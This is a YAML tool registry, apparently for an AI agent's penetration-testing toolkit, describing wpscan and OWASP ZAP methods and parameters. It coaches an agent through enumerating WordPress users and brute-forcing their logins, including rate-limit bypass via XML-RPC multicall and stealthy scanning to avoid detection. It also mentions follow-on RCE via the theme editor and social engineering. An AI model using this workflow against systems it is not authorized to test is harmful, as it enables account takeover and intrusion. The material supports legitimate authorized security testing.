            default: 30
            description: Request timeout
        returns:
          token:
            type: string
            description: Extracted CSRF token
          tokens:
            type: array
            description: All tokens found
      delete_session:
        description: Delete a stored session
        when_to_use: To clean up sessions or logout
        params:
          session_name:
            type: string
            required: true
            description: Session name to delete
        returns:
          session_name:
            type: string
            description: Name of deleted session
          deleted:
            type: boolean
            description: Whether session was deleted
  wpscan:
    name: wpscan
    version: 3.8.28
    description: 'WordPress security scanner (WPScan v3.8.28, Ruby-based) for comprehensive WordPress enumeration and vulnerability
      assessment. Detects WordPress version, enumerates plugins (vulnerable/all/popular), themes (vulnerable/all/popular),
      users (with configurable ID range), timthumbs, config backups (wp-config.php~, wp-config.bak, etc.), and database exports.
      Three detection modes: passive (minimal requests), aggressive (brute-force file detection), and mixed (default). JSON
      output with structured parsing of plugins, themes, users, and vulnerabilities. Supports WPVulnDB API token (25 free
      lookups/day via WPSCAN_API_TOKEN env var or --api-token) for mapping detected plugins/themes to known CVEs. Password
      brute-force via wp-login, XML-RPC, or XML-RPC multicall (500 passwords/request, WP < 4.4 only). Built-in --stealthy
      mode (passive detection + random user agent).'
    image: ghcr.io/silicon-works/mcp-tools-wpscan:latest
    image_size_mb: 300
    capabilities:
    - wordpress_scanning
    - plugin_detection
    - theme_detection
    - user_enumeration
    - password_bruteforce
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 512
      cpu: 0.5
    routing:
      use_for:
      - scan a WordPress site for vulnerable plugins themes and outdated versions
      - enumerate WordPress plugins and check for known CVEs
      - enumerate WordPress users for brute-force targeting
      - brute-force WordPress login passwords via wp-login or XML-RPC
      - detect WordPress version and check for version-specific vulnerabilities
      - find WordPress config backups and database exports
      - detect outdated WordPress plugins with known exploits
      - test for weak WordPress admin passwords
      never_use_for:
      - non-WordPress sites (use nikto or nuclei)
      - general vulnerability scanning (use nuclei)
      - port scanning (use nmap)
      triggers:
      - WordPress
      - wpscan
      - wp-content
      - wp-admin
      - wp plugin
      - wp theme
      prefer_over:
      - nuclei
    environment:
      WPSCAN_API_TOKEN:
        description: WPVulnDB API token for vulnerability data lookups. 25 free requests/day at https://wpscan.com/profile.
          Without this, scan results will NOT include vulnerability data for detected plugins/themes — only version detection.
        required: false
    methods:
      scan:
        description: 'Comprehensive WordPress scan combining version detection, plugin/theme enumeration, user enumeration,
          and vulnerability mapping into a single operation. Runs wpscan with --format json and --random-user-agent. Parses
          JSON output into structured results: WordPress core version, main theme (name + version), plugins (name + version
          + vulnerability count), users (username + ID), and all vulnerabilities found across plugins/themes. Enumeration
          scope is controlled by the enumerate parameter (comma-separated flags). Uses WPVulnDB API to map detected plugin/theme
          versions to known CVEs — requires an API token for vulnerability data. Without a token, only version detection works
          (no CVE matching).'
        when_to_use: 'The first tool to run after web-fingerprint or manual inspection confirms a WordPress installation.
          Signs of WordPress: ''/wp-content/'' or ''/wp-includes/'' in page source, ''wp-login.php'' login page, ''X-Powered-By:
          WordPress'' header, ''/xmlrpc.php'' endpoint. The default enumerate=''vp,vt,u'' is a good starting point — finds
          vulnerable plugins, vulnerable themes, and users. If the default finds nothing, try enumerate=''ap,at,u'' to scan
          all plugins/themes (not just known-vulnerable ones). For thorough scans, use enumerate=''ap,at,u,cb,dbe'' to also
          check for config backups and database exports. An API token is strongly recommended — without it, the scan cannot
          report known CVEs for detected plugins.'
        params:
          url:
            type: string
            required: true
            description: 'Target WordPress URL including protocol. Examples: ''http://target.com'', ''https://blog.target.com'',
              ''http://target.com/wordpress/''. WPScan auto-detects wp-content and wp-plugins directories. If the site returns
              403 or doesn''t look like WordPress, use force=true.'
          enumerate:
            type: string
            default: vp,vt,u
            description: 'Comma-separated enumeration flags. vp=vulnerable plugins (fast, needs API token), ap=all plugins
              (slower, ~100 threshold), p=popular plugins. vt=vulnerable themes, at=all themes, t=popular themes. u=users
              (default range 1-10, customizable as u1-50). tt=timthumbs (file upload vuln). cb=config backups (wp-config.php~,
              .bak, .old, etc.). dbe=database exports. m=media IDs. Incompatible groups: only one of vp/ap/p and one of vt/at/t.
              Recommended combos: ''vp,vt,u'' (quick), ''ap,at,u,cb,dbe'' (thorough).'
          plugins_detection:
            type: enum
            values:
            - passive
            - aggressive
            - mixed
            default: mixed
            description: Plugin detection mode. passive=checks only known locations in page source (fast, stealthy, may miss
              plugins). aggressive=brute-forces plugin directory paths from the database (slow, noisy, finds more plugins).
              mixed=passive first, then aggressive for version detection. Use passive for stealth, aggressive when you need
              comprehensive results.
          api_token:
            type: string
            description: WPVulnDB API token from https://wpscan.com/profile (25 free lookups/day). One API request per WordPress
              version check, per plugin, per theme. Required for vulnerability data — without it, scan only reports versions,
              not CVEs. Can also be set via WPSCAN_API_TOKEN environment variable.
          stealthy:
            type: boolean
            default: false
            description: Stealthy mode — passive detection + random user agent. Equivalent to WPScan's --stealthy flag (alias
              for --random-user-agent --detection-mode passive --plugins-version-detection passive). Use when avoiding detection
              is more important than thoroughness.
          force:
            type: boolean
            default: false
            description: Force scan even if the site doesn't appear to be WordPress or returns 403. Useful when WordPress
              is at a non-standard path, behind a WAF, or the homepage redirects.
          cookie_string:
            type: string
            description: 'Cookie string for authenticated scanning. Format: ''cookie1=value1; cookie2=value2''. Useful for
              scanning behind WAFs that require cookies, or for authenticated-only WordPress installs.'
          timeout:
            type: integer
            default: 300
            description: Scan timeout in seconds. 300s (5 min) is usually sufficient for 'vp,vt,u'. For 'ap,at' (all plugins/themes),
              increase to 600-900s as aggressive detection checks hundreds of paths.
        returns:
          wordpress_version:
            type: string
            description: Detected WordPress core version (e.g., '6.4.3'). Null if version detection failed.
          plugins:
            type: array
            description: 'Detected plugins, each with: name (slug), version, vulnerability count. Only vulnerable plugins
              shown with ''vp'', all with ''ap''.'
          themes:
            type: array
            description: 'Detected themes including main theme, each with: name (slug), version.'
          users:
            type: array
            description: 'Enumerated users with: username, WordPress user ID. Use these usernames for bruteforce method.'
          vulnerabilities:
            type: array
            description: 'All vulnerabilities found across plugins/themes, each with: plugin/theme name, title, vuln_type,
              reference URLs. Only populated when API token is provided.'
      bruteforce:
        description: 'Brute-force WordPress login using wpscan''s built-in password attack. Runs wpscan with --passwords and
          --usernames flags. WPScan auto-detects the best attack method: wp-login (POST to /wp-login.php, 1 password/request),
          xmlrpc (POST to /xmlrpc.php, faster), or xmlrpc-multicall (batches up to 500 passwords per request via XML-RPC system.multicall
          — only works on WP < 4.4). Attack mode can be overridden with the attack_mode parameter. Uses --random-user-agent.
          Parses JSON output for cracked credentials. Wordlist must be provided — download to /session/wordlists/ first using
          curl.download_to_file.'
        when_to_use: 'After enumerate_users discovers valid WordPress usernames, especially ''admin'' or ''administrator''.
          The typical WordPress brute-force workflow: (1) enumerate_users to find usernames, (2) bruteforce with a common
          password list against each user. Try the admin user first — it''s the most valuable target (full WordPress admin
          access). For CTFs, common passwords like ''admin'', ''password'', ''wordpress'' should be tried first. For real
          engagements, use a targeted wordlist. Note: WordPress has no default lockout mechanism, but security plugins (Wordfence,
          Sucuri, etc.) may block after failed attempts. XML-RPC multicall bypasses per-request rate limiting on WP < 4.4.'
        params:
          url:
            type: string
            required: true
            description: Target WordPress URL (same as scan).
          username:
            type: string
            required: true
            description: Username to brute-force. Use a username discovered by enumerate_users. Can also be a comma-separated
              list ('admin,editor,john') or a file path ('/tmp/users.txt').
          wordlist:
            type: string
            required: true
            description: Path to password wordlist file. Download to /session/wordlists/ first using curl.download_to_file
              (e.g., '/session/wordlists/rockyou.txt'). For faster targeted attempts, create a custom wordlist with the Write
              tool.
          attack_mode:
            type: enum
            values:
            - auto
            - wp-login
            - xmlrpc
            - xmlrpc-multicall
            default: auto
            description: Password attack method. auto=WPScan picks the best method. wp-login=POST to /wp-login.php (1 password/request,
              always works). xmlrpc=via XML-RPC wp.getUsersBlogs (faster). xmlrpc-multicall=batches up to 500 passwords per
              request via system.multicall (fastest, only works on WP < 4.4). Use wp-login when XML-RPC is disabled. Use xmlrpc-multicall
              for old WordPress installs.
          timeout:
            type: integer
            default: 600
            description: Timeout in seconds. 600s (10 min) for small wordlists. For rockyou.txt (14M passwords), this will
              timeout long before completing — use a smaller targeted wordlist instead.
        returns:
          password_found:
            type: object
            description: Object with username and password if a valid credential was found. Null if no password matched. On
              success, these credentials can be used to log into /wp-admin/ for further exploitation (theme editor RCE, plugin
              upload, etc.).
      enumerate_users:
        description: 'Enumerate WordPress users by probing user ID endpoints. WPScan checks: /?author=N (redirects reveal
          usernames), /wp-json/wp/v2/users (REST API, often publicly accessible), and login error messages (reveals whether
          username exists). Default range is user IDs 1-10. Returns username, WordPress user ID, and slug for each discovered
          user. Uses --random-user-agent.'
        when_to_use: 'Early in WordPress enumeration, before brute-force attempts. Even if the scan method already includes
          ''u'' in its enumerate flags, this dedicated method provides cleaner output focused only on users. The discovered
          usernames feed directly into the bruteforce method. Key usernames to look for: ''admin'' (default WordPress admin,
          often not renamed), ''administrator'', and any names that suggest elevated privileges. Also useful for social engineering
          — author names are often real names.'
        params:
          url:
            type: string
            required: true
            description: Target WordPress URL.
          api_token:
            type: string
            description: WPVulnDB API token. Not strictly needed for user enumeration (no vulnerability lookup), but wpscan
              may still use it if provided.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds. User enumeration is fast — 300s is more than sufficient for the default 1-10
              ID range.
        returns:
          users:
            type: array
            description: 'Discovered users, each with: username (login name), id (WordPress user ID), slug (URL-safe username).
              The username field is what you pass to bruteforce.'
          count:
            type: integer
            description: Number of users discovered.
      enumerate_plugins:
        description: Enumerate WordPress plugins and map them to known vulnerabilities via WPVulnDB. Uses wpscan with --enumerate
          vp (vulnerable plugins only) or ap (all plugins) and --format json. Plugin detection works by checking known plugin
          paths under /wp-content/plugins/ — passive mode checks page source references, aggressive mode brute-forces directory
          names from the WPScan database. For each plugin found, returns the slug, detected version, outdated status, and
          vulnerability count. Vulnerabilities include title, type (SQLi, XSS, RCE, LFI, etc.), CVE IDs, and reference URLs.
          An API token is essential — without it, only plugin names and versions are returned, not vulnerability data.
        when_to_use: 'The highest-value WordPress enumeration step. WordPress sites average 22 installed plugins, and plugins
          are the #1 source of WordPress vulnerabilities. Run this after confirming WordPress to find exploitable plugins.
          Use aggressive detection mode for thorough results — passive mode often misses plugins that aren''t referenced in
          the page source. If ''vp'' (vulnerable-only) returns nothing, switch to all_plugins=true (''ap'') to see all installed
          plugins, then manually research their versions. The API token is critical here — without it, you can''t tell which
          plugins have known CVEs.'
        params:
          url:
            type: string
            required: true
            description: Target WordPress URL.
          detection_mode:
            type: enum
            values:
            - passive
            - aggressive
            - mixed
            default: aggressive
            description: Plugin detection mode. aggressive=brute-forces known plugin directory names (slower, finds more —
              recommended). passive=only checks page source for plugin references (fast, misses many). mixed=passive detection
              with aggressive version checking. Default 'aggressive' is correct for most use cases.
          all_plugins:
            type: boolean
            default: false
            description: false (default) = enumerate only plugins with known vulnerabilities (--enumerate vp). true = enumerate
              all detected plugins (--enumerate ap) regardless of vulnerability status. Use true when vp returns no results
              — the plugin may be vulnerable but not in WPVulnDB, or you may lack an API token.
          api_token:
            type: string
            description: WPVulnDB API token (25 free/day). Each detected plugin consumes one API request. Essential for vulnerability
              mapping — without it, only plugin names/versions are returned.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds. aggressive mode with all_plugins=true can take 2-5 minutes. Increase to 600s
              if scanning large sites.
        returns:
          plugins:
            type: array
            description: 'Detected plugins, each with: name (slug like ''contact-form-7''), version (detected or null), outdated
              (boolean), vulnerability_count.'
          vulnerabilities:
            type: array
            description: 'Plugin vulnerabilities, each with: plugin name, title (vulnerability description), type (vuln_type:
              SQLi, XSS, RCE, etc.), cve (list of CVE IDs), references (URLs to advisories/exploits). Use CVE IDs with cve-lookup
              for full details.'
          plugin_count:
            type: integer
            description: Total plugins detected.
          vulnerability_count:
            type: integer
            description: Total vulnerabilities found across all plugins.
      enumerate_themes:
        description: Enumerate WordPress themes and map them to known vulnerabilities via WPVulnDB. Detects the active (main)
          theme and any additional installed themes. Uses wpscan with --enumerate vt (vulnerable themes only) or at (all themes)
          and --format json. The main theme is always identified (from page source CSS/JS references). Additional themes are
          found by brute-forcing theme directory names under /wp-content/themes/. Returns theme slug, version, main_theme
          flag, and vulnerability data with CVE IDs.
        when_to_use: After plugin enumeration, check themes for vulnerabilities. Themes are less commonly vulnerable than
          plugins, but theme vulnerabilities (especially in theme framework components like timthumbs) can provide file upload,
          LFI, or RCE. The main theme is always detected — if it's outdated or has known CVEs, it's an immediate finding.
          Use all_themes=true only if vulnerable-theme enumeration returns nothing and you want to manually research installed
          themes.
        params:
          url:
            type: string
            required: true
            description: Target WordPress URL.
          all_themes:
            type: boolean
            default: false
            description: false (default) = enumerate only themes with known vulnerabilities (--enumerate vt). true = enumerate
              all detected themes (--enumerate at). The main/active theme is always detected regardless of this setting.
          api_token:
            type: string
            description: WPVulnDB API token. Each detected theme consumes one API request. Needed for CVE mapping.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds. Theme enumeration is generally faster than plugin enumeration — 300s is sufficient.
        returns:
          themes:
            type: array
            description: 'Detected themes, each with: name (slug), version, is_main_theme (boolean — true for the active theme),
              vulnerability_count.'
          vulnerabilities:
            type: array
            description: 'Theme vulnerabilities, each with: theme name, title, type, cve (list of CVE IDs), references (URLs).
              Less common than plugin vulns but can be high-impact.'
          theme_count:
            type: integer
            description: Total themes detected.
          vulnerability_count:
            type: integer
            description: Total vulnerabilities found across all themes.
  zap:
    name: zap
    version: '2.14'
    description: 'OWASP ZAP 2.14 web application security scanner. 12 methods: spider (crawl to discover URLs), active_scan
      (test for SQLi, XSS, OWASP Top 10), quick_scan (spider + active scan combined), ajax_spider (Chrome headless for JavaScript-heavy
      SPAs), stop_scan, get_alerts (vulnerability details by severity), get_urls, scan_status, summary, proxy_history (captured
      HTTP traffic like Burp), send_request (manual HTTP like Burp Repeater), proxy_info (proxy settings for Playwright integration).
      Runs as a service container with persistent state. Can proxy Playwright browser traffic for combined JS app testing.'
    image: ghcr.io/silicon-works/mcp-tools-zap:latest
    image_size_mb: 1200
    capabilities:
    - web_vulnerability_scanning
    - active_scanning
    - spider_crawling
    - xss_detection
    - sqli_detection
    - security_assessment
    routing:
      use_for:
      - automated web application vulnerability scanning for OWASP Top 10
      - active scan to find XSS SQL injection and other web vulnerabilities
      - spider crawl web application to discover all pages and API endpoints
      - crawl JavaScript SPA applications with ajax spider Chrome headless
      - intercept and replay HTTP requests like Burp Suite Repeater
      - proxy Playwright browser traffic through ZAP for JS-heavy app testing
      - get vulnerability report with severity levels after web application scan
      never_use_for:
      - port scanning
      - network scanning
      - password cracking
      triggers:
      - ZAP
      - OWASP
      - active scan
      - web scanner
      - spider
      - crawl
      - web vulnerability
      prefer_over:
      - nikto
      - curl
    see_also:
    - playwright-mcp
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 2048
      cpu: 2.0
    methods:
      spider:
        description: Crawl a target URL to discover all pages and endpoints
        when_to_use: To discover all URLs on a web application before scanning
        params:
          target:
            type: string
            required: true
            description: Target URL to crawl (e.g., http://target.com)
          max_depth:
            type: integer
            default: 5
            description: Maximum crawl depth
          max_children:
            type: integer
            default: 0
            description: Maximum child URLs per page (0=unlimited)
          wait:
            type: boolean
            default: true
            description: Wait for spider to complete (if false, returns immediately with scan_id)
          timeout:
            type: integer
            default: 300
            description: Maximum seconds to wait for spider. Returns partial results on timeout.
          subtree_only:
            type: boolean
            default: true
            description: Only spider URLs under the target path (recommended)
        returns:
          scan_id:
            type: string
            description: Spider scan ID for status checking
          urls_found:
            type: integer
            description: Number of URLs discovered
          progress:
            type: integer
            description: Spider progress percentage (0-100)
          partial:
            type: boolean
            description: True if scan timed out with partial results
      active_scan:
        description: Actively scan a target for vulnerabilities (SQLi, XSS, etc.)
        when_to_use: To test a web application for security vulnerabilities
        params:
          target:
            type: string
            required: true
            description: Target URL to scan
          wait:
            type: boolean
            default: true
            description: Wait for scan to complete (if false, returns immediately with scan_id)
          timeout:
            type: integer
            default: 600
            description: Maximum seconds to wait for scan. Returns partial results on timeout.
          scan_policy:
            type: string
            description: 'Scan policy name: ''Default Policy'' or custom. Controls which checks run.'
        returns:
          scan_id:
            type: string
            description: Active scan ID for status checking
          progress:
            type: integer
            description: Scan progress percentage (0-100)
          alerts:
            type: object
            description: 'Counts by severity: high, medium, low, info, total'
          partial:
            type: boolean
            description: True if scan timed out with partial results
      quick_scan:
        description: 'Perform a complete scan: spider the target then run active scan. Returns partial results if either phase
          times out.'
        when_to_use: For a comprehensive security assessment of a web application
        params:
          target:
            type: string
            required: true
            description: Target URL to scan
          max_depth:
            type: integer
            default: 5
            description: Maximum spider depth
          max_children:
            type: integer
            default: 0
            description: Maximum child URLs per page (0=unlimited)
          spider_timeout:
            type: integer
            default: 300
            description: Maximum seconds for spider phase
          scan_timeout:
            type: integer
            default: 900
            description: Maximum seconds for active scan phase
          scan_policy:
            type: string
            description: Scan policy name for active scan phase
          ajax_spider:
            type: boolean
            default: false
            description: Run AJAX spider after traditional spider (for JavaScript-heavy sites)
          exclude_regex:
            type: string
            description: Regex pattern for URLs to exclude (e.g., 'logout|delete|signout')
        returns:
          spider_id:
            type: string
            description: Spider scan ID
          scan_id:
            type: string
            description: Active scan ID
          urls_found:
            type: integer
            description: Number of URLs discovered
          alerts:
            type: object
            description: 'Counts by severity: high, medium, low, info, total'
          partial:
            type: boolean
            description: True if any phase timed out
      stop_scan:
        description: Stop a running spider or active scan
        when_to_use: To cancel a stuck or long-running scan
        params:
          scan_type:
            type: string
            required: true
            description: 'Type of scan to stop: ''spider'', ''active'', ''ajax'', or ''all'''
          scan_id:
            type: string
            description: Specific scan ID to stop. If not provided, stops all scans of the type.
        returns:
          stopped:
            type: array
            description: List of stopped scans with type and id
      get_alerts:
        description: Get vulnerabilities discovered by ZAP
        when_to_use: To retrieve detailed vulnerability information after scanning
        params:
          target:
            type: string
            description: Filter alerts by target URL (optional)
          risk:
            type: string
            description: 'Filter by risk level: High, Medium, Low, Informational'
          limit:
            type: integer
            default: 100
            description: Maximum number of alerts to return
        returns:
          alerts:
            type: array
            description: List of vulnerabilities with details
      get_urls:
        description: Get all URLs discovered by the spider
        when_to_use: To see what pages were found during crawling
        params:
          target:
            type: string
            description: Filter URLs by base URL (optional)
        returns:
          urls:
            type: array
            description: List of discovered URLs
      scan_status:
        description: Get the status of all running and completed scans
        when_to_use: To check progress of background scans or verify scan completion
        params: {}
        returns:
          spider_scans:
            type: array
            description: List of spider scans with id, progress, state, urls_found
          active_scans:
            type: array
            description: List of active scans with id, progress, state, alerts count
          running_spiders:
            type: integer
            description: Number of currently running spider scans
          running_scans:
            type: integer
            description: Number of currently running active scans
      summary:
        description: Get a summary of all findings by risk level
        when_to_use: To get an overview of discovered vulnerabilities
        params:
          target:
            type: string
            description: Filter by target URL (optional)
        returns:
          total:
            type: integer
            description: Total number of issues
          by_risk:
            type: object
            description: Issue counts by risk level
      proxy_history:
        description: Get HTTP messages captured by ZAP proxy
        when_to_use: To review traffic that passed through the proxy
        params:
          start:
            type: integer
            default: 0
            description: Start index
          count:
            type: integer
            default: 50
            description: Number of messages to return
          target:
            type: string
            description: Filter by target URL (optional)
        returns:
          messages:
            type: array
            description: List of HTTP request/response pairs
      send_request:
        description: Send an HTTP request through ZAP proxy and get the response (like Burp Repeater)
        when_to_use: To manually send or replay HTTP requests for testing
        params:
          url:
            type: string
            required: true
            description: Full URL to request (e.g., http://target.com/path)
          method:
            type: string
            default: GET
            description: HTTP method (GET, POST, PUT, DELETE, etc.)
          headers:
            type: object
            description: Custom headers as key-value pairs
          body:
            type: string
            description: Request body for POST/PUT requests
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects
        returns:
          url:
            type: string
            description: Request URL
          status_code:
            type: integer
            description: HTTP response status code
          content_length:
            type: integer
            description: Response body length in bytes
      proxy_info:
        description: Get ZAP proxy connection info for routing Playwright traffic through ZAP
        when_to_use: '- Before using Playwright to test JS-heavy applications

          - When you need ZAP to capture and analyze browser traffic

          - For combining Playwright automation with ZAP scanning

          '
        notes: 'RECOMMENDED APPROACH for JavaScript-heavy applications:


          1. Call zap.proxy_info() to get proxy host:port

          2. Launch Playwright browser with proxy settings

          3. Use Playwright to navigate, login, interact with the app

          4. ZAP captures all traffic via proxy_history

          5. Run active_scan on captured URLs for vulnerability detection


          This approach is more reliable than ajax_spider and gives full control

          over browser interactions (auth flows, form filling, waiting for elements).

          '
        params: {}
        returns:
          port:
            type: integer
            description: Proxy port number
          instructions:
            type: string
            description: Setup instructions
      ajax_spider:
        description: Crawl JavaScript-heavy applications using Chrome headless browser
        when_to_use: '- Single Page Applications (React, Vue, Angular)

          - Pages with dynamic content loading

          - When traditional spider misses endpoints

          - Automated JS app crawling without custom interaction logic

          '
        notes: 'Uses Chrome headless (more reliable than Firefox in Docker).

          Automatically discovers endpoints by executing JavaScript and clicking links.


          For CUSTOM interactions (specific login flows, complex forms), use Playwright+ZAP:

          1. zap.proxy_info() - get proxy settings

          2. playwright with proxy - custom browser automation

          3. zap.proxy_history() - captured traffic

          4. zap.active_scan() - vulnerability scanning

          '
        params:
          target:
            type: string
            required: true
            description: Target URL to crawl (e.g., http://target.com)
          wait:
            type: boolean
            default: true
            description: Wait for spider to complete
          timeout:
            type: integer
            default: 300
            description: Maximum seconds to wait for spider
          subtree_only:
            type: boolean
            default: true
            description: Only spider URLs under the target path
          max_crawl_depth:
            type: integer
            default: 10
            description: Maximum crawl depth
          max_duration:
            type: integer
            default: 0
            description: Maximum duration in minutes (0=unlimited)
        returns:
          urls:
            type: array
            description: List of discovered URLs
          urls_count:
            type: integer
            description: Number of URLs discovered
          partial:
            type: boolean
            description: True if scan timed out with partial results
